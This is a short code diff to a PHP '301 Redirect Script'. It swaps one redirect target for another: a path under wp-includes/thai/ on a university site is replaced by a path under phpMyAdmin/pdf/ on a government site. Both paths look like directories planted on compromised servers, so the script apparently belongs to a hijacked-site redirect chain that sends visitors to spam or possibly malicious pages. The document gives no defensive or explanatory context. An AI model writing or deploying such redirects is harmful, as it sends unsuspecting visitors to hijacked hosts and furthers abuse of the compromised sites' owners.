@@ -2,7 +2,7 @@
 // 301 Redirect Script
 
 // The new URL where the old URL should redirect
-$new_url = "https://sdgscenter.unair.ac.id/wp-includes/thai/";
+$new_url = "https://si-pelangsing.badungkab.go.id/phpMyAdmin/pdf/";
 
 // Send the 301 Moved Permanently status code
 header("HTTP/1.1 301 Moved Permanently");
